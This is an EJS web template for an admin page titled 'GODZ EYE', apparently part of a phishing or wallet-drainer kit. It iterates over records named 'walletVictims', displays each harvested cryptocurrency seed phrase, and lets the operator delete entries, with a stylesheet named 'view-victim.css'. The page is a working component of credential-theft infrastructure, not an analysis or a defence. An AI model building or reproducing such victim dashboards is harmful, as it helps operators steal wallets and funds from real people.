<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Control the color of the mobile browser -->
    <meta name="theme-color" content="#1f2125"> 
    <title>Wallet View</title>
    <link rel="icon" href="/uploads/favicon.png" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.4.0/fonts/remixicon.css" rel="stylesheet" />
    <link rel="stylesheet" href="/css/view-victim.css">
</head>

<body>


    <div class="gods-eye">

        <h2>GODZ EYE</h2>

        <a href="/dashboard" class="back-to-dashboard"><i class="ri-links-line"></i></a>
        <ul>
            <% if (walletVictims && walletVictims.length> 0) { %>
                <% walletVictims.forEach(wallet=> { %>
                    <li class="mua">
                        <div class="details">
                            <strong>Seed Phrase: <p>
                                    <%= wallet.seedPhrase.join(', ') %></p></strong>
                    </div>
    
                    <form action="/delete-wallet/<%= wallet._id %>" method="POST" style="display:inline;">
                        <button type="submit">Delete</button>
                    </form>
                </li>
            <% }); %>
        <% } else { %>
            <p>No wallet data found...</p>
        <% } %>
    </ul>
    </div>


    <script src="https://kit.fontawesome.com/b3fa93e021.js" crossorigin="anonymous"></script>

</body>

</html>